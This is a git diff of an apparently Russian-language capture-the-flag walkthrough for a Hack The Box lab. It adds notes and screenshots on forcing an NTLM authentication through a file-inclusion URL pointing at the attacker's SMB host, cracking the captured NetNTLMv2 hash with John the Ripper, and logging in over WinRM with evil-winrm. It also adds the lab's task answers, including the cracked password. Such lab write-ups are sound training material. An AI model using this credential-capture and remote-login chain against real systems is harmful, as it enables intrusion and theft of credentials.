@@ -63,9 +63,18 @@ ans: John the Ripper
 ~~~
 curl "http://unika.htb/index.php?page=//10.10.14.39/somefile"
 ~~~
+<img width="417" height="213" alt="Снимок экрана 2026-06-26 в 07 42 58" src="https://github.com/user-attachments/assets/8458eaa0-f143-43e3-b9df-cc4ca3b66a47" />
+
+Копируем всю строку после hash:.... 
+создаем файл .txt и закидываем туда и отправляем в john
+
 ~~~
 john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt shash.txt
 ~~~
+
+<img width="690" height="201" alt="Снимок экрана 2026-06-26 в 07 44 44" src="https://github.com/user-attachments/assets/7a7c413e-907d-4828-801c-384dc041761f" />
+
+[после этого я пытлася подключиться по smbclient и ушло некотрое время пока не понял что не нужно так]
 
 task 9: What is the password for the administrator user?
 ans: badminton
@@ -73,6 +82,19 @@ ans: badminton
 ~~~
 evil-winrm -i 10.129.95.234 -u administrator -p badminton
 ~~~
+
+task 10: We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
+ans: 5985
+НУ мы изначально просмотрели через nmap -p-
+
+<img width="690" height="459" alt="Снимок экрана 2026-06-26 в 07 46 53" src="https://github.com/user-attachments/assets/54d8f283-ed2b-4454-9083-753251e8b40d" />
+
+
+task 11: On which user's desktop is the flag located?
+
+
+flag: ubmit the flag located on the mike user's desktop.
+там же))
 
 
 ### navigation win
@@ -85,3 +107,10 @@ echo	Вывести текст или записать в файл
 cls	Очистить экран
 exit	Выйти из сессии
 
+
+___ 
+Узнал про:
+новое подключение "evil-winrm"
+про responder и NTLM 
+
+восторг!
